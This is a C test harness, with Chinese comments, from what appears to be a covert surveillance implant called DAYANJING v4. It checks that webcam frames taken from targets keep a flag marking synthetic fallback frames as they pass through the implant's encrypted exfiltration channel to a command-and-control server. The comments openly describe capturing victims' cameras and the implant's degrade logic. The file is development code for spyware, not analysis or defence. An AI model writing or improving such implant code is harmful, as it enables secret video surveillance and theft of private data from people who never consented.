/*
 * DAYANJING v4 — test_exfil_srcflag.c
 *
 * 采集源标志位（EXF_FLAG_SRC_SYNTH）的回传保真验证。
 *
 * ====================================================================
 * 为什么需要它（本文件存在的唯一理由）
 * ====================================================================
 * 采集后端打不开设备时会静默切合成帧，整条链路仍返回成功：调用方拿到
 * 合法 JPEG、零报错、持续送达，与真人画面逐字节无法区分。真实目标上最高频
 * 的触发是摄像头被占用（用户开着视频会议）——open 与格式协商都过，
 * REQBUFS/STREAMON 才失败。
 *
 * 为此在 exfil 记录头里加了 EXF_FLAG_SRC_SYNTH 位，由 cam_daemon 依据
 * implant_degrade() 置位，随帧加密送达 C2。它是 C2 侧唯一能判定
 * "这批画面是不是真人"的字段。
 *
 * 本文件验证的是这个位**真的能穿过整条回传链路到达接收侧**。
 * 只验证"编得过"是不够的：
 *   - flags 在头里是 1 字节，若编码侧写成窄类型或在序列化时被掩码掉，
 *     编译毫无警告，而 C2 永远收不到这个位；
 *   - 0x08 与已有的 NAME_TRUNC(0x04) 相邻，位混淆会让"名字被截断"
 *     被误读成"画面是合成的"，或反之。
 *
 * ====================================================================
 * 判据：完整往返，不是局部断言
 * ====================================================================
 *   exfil_rec_encode -> 信元分片 -> exfil_chan_send -> exfil_chan_feed
 *   -> exfil_rec_decode，比较**接收侧解出的 flags** 与发送侧置入的 flags。
 *
 * 走完整信元层而非只调 encode/decode：真实链路就是这样走的，
 * 只验编解码会漏掉"信元层改了字节"这一类失效。
 *
 * ====================================================================
 * 反向验证模式（argv[1]）
 * ====================================================================
 *   （无）      正常：置 SYNTH 位，往返后必须仍在
 *   nosynth     不置 SYNTH 位，往返后必须仍不在
 *                -> 证明"位存在"不是因为解码侧恒返回该位（恒绿检测）
 *   adjacent    只置 NAME_TRUNC(0x04)，不带 SYNTH
 *                -> 往返后必须精确等于 0x04，不能多出 SYNTH。
 *                   这是位混淆的鉴别力证明：若实现把相邻位搞混，
 *                   这里会失败。
 */

#include "exfil.h"

#include <stdio.h>
#include <string.h>

static int g_pass = 0;
static int g_fail = 0;

#define CHECK(cond, ...)                                      \
    do {                                                      \
        if (cond) { g_pass++; printf("[PASS] "); }            \
        else      { g_fail++; printf("[FAIL] "); }            \
        printf(__VA_ARGS__);                                  \
        printf("\n");                                         \
    } while (0)

/* 方向分离的两个密钥（必须互不相同），与 nonce 前缀。
 * 本测试不涉密，取固定值只为可复现。 */
static const uint8_t K_SEND[P2P_CELL_KEY_LEN] = {
    0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
    0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10
};
static const uint8_t K_RECV[P2P_CELL_KEY_LEN] = {
    0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,
    0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20
};
static const uint8_t PFX[P2P_CELL_PFX_LEN] = {
    0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8
};

/* 一条记录走完整信元往返，返回接收侧解出的 flags；返回 <0 表示链路失败。 */
static int roundtrip_flags(uint32_t flags_in, uint32_t *flags_out)
{
    exfil_chan_t s_ch, r_ch;
    if (exfil_chan_init(&s_ch, K_SEND, K_RECV, PFX, 0) != 0) return -100;
    if (exfil_chan_init(&r_ch, K_RECV, K_SEND, PFX, 0) != 0) {
        exfil_chan_wipe(&s_ch);
        return -101;
    }

    /* 载荷取非平凡内容：空载荷会掩盖"分片错位"一类错误，
     * 且真实帧必然非空。 */
    static uint8_t payload[3000];
    for (size_t i = 0; i < sizeof payload; i++)
        payload[i] = (uint8_t)(i * 7 + 3);

    exfil_rec_t r;
    memset(&r, 0, sizeof r);
    r.type    = EXF_TYPE_CAMERA_JPEG;
    r.seq     = 42;
    r.ts_us   = 1700000000000000ULL;
    r.width   = 640;
    r.height  = 480;
    r.flags   = flags_in;
    r.payload = payload;
    r.plen    = sizeof payload;
    snprintf(r.name, sizeof r.name, "Integrated Camera");

    size_t ncells = 0;
    if (exfil_send_cells(&r, &ncells) != 0) { goto out; }

    size_t cap = ncells * (size_t)P2P_CELL_WIRE + 64;
    static uint8_t wire[1 << 20];
    if (cap > sizeof wire) { exfil_chan_wipe(&s_ch); exfil_chan_wipe(&r_ch); return -102; }

    size_t got = 0;
    if (exfil_chan_send(&s_ch, &r, wire, cap, &got) != 0) goto out;

    /* 逐信元喂入接收侧，直至重组完成 */
    exfil_rec_t out;
    static uint8_t obuf[1 << 20];
    size_t olen = 0;
    int done = 0;
    for (size_t i = 0; i < got; i++) {
        memset(&out, 0, sizeof out);
        int e = exfil_chan_feed(&r_ch, wire + i * (size_t)P2P_CELL_WIRE,
                                &out, obuf, sizeof obuf, &olen);
        if (e == EXF_DONE) { done = 1; break; }
        if (e != EXF_PARTIAL && e != EXF_OK) goto out;
    }
    if (!done) goto out;

    *flags_out = out.flags;
    exfil_chan_wipe(&s_ch);
    exfil_chan_wipe(&r_ch);
    return 0;

out:
    exfil_chan_wipe(&s_ch);
    exfil_chan_wipe(&r_ch);
    return -1;
}

int main(int argc, char **argv)
{
    const char *mode = (argc > 1) ? argv[1] : "";

    if (strcmp(mode, "adjacent") == 0) {
        /* 位混淆鉴别力：只置相邻的 NAME_TRUNC(0x04) */
        uint32_t got = 0xdeadbeef;
        int rc = roundtrip_flags(EXF_FLAG_KEYFRAME | EXF_FLAG_NAME_TRUNC, &got);
        CHECK(rc == 0, "adjacent: 链路往返成功 rc=%d", rc);
        if (rc == 0) {
            CHECK(got == (uint32_t)(EXF_FLAG_KEYFRAME | EXF_FLAG_NAME_TRUNC),
                  "adjacent: 接收侧 flags 精确等于发送侧（无相邻位混淆）"
                  " got=0x%02x want=0x%02x",
                  got, (uint32_t)(EXF_FLAG_KEYFRAME | EXF_FLAG_NAME_TRUNC));
            CHECK((got & EXF_FLAG_SRC_SYNTH) == 0,
                  "adjacent: NAME_TRUNC 不得被误读为 SRC_SYNTH got=0x%02x", got);
        }
        printf("-------- passed: %d  failed: %d --------\n", g_pass, g_fail);
        return g_fail ? 1 : 0;
    }

    if (strcmp(mode, "nosynth") == 0) {
        /* 恒绿检测：不置位时接收侧也不得出现该位 */
        uint32_t got = 0xdeadbeef;
        int rc = roundtrip_flags(EXF_FLAG_KEYFRAME | EXF_FLAG_LAST, &got);
        CHECK(rc == 0, "nosynth: 链路往返成功 rc=%d", rc);
        if (rc == 0) {
            CHECK((got & EXF_FLAG_SRC_SYNTH) == 0,
                  "nosynth: 未置位则接收侧不得出现 SRC_SYNTH got=0x%02x", got);
            CHECK(got == (uint32_t)(EXF_FLAG_KEYFRAME | EXF_FLAG_LAST),
                  "nosynth: flags 精确往返 got=0x%02x", got);
        }
        printf("-------- passed: %d  failed: %d --------\n", g_pass, g_fail);
        return g_fail ? 1 : 0;
    }

    /* 正常模式：置 SYNTH 位，必须活着到达接收侧 */
    uint32_t got = 0;
    int rc = roundtrip_flags(EXF_FLAG_KEYFRAME | EXF_FLAG_LAST | EXF_FLAG_SRC_SYNTH, &got);
    CHECK(rc == 0, "synth: 链路往返成功 rc=%d", rc);
    if (rc == 0) {
        CHECK((got & EXF_FLAG_SRC_SYNTH) != 0,
              "synth: SRC_SYNTH 穿过信元层到达接收侧 got=0x%02x", got);
        CHECK(got == (uint32_t)(EXF_FLAG_KEYFRAME | EXF_FLAG_LAST | EXF_FLAG_SRC_SYNTH),
              "synth: flags 精确往返，未污染其它位 got=0x%02x want=0x%02x",
              got, (uint32_t)(EXF_FLAG_KEYFRAME | EXF_FLAG_LAST | EXF_FLAG_SRC_SYNTH));
    }

    printf("-------- passed: %d  failed: %d --------\n", g_pass, g_fail);
    return g_fail ? 1 : 0;
}
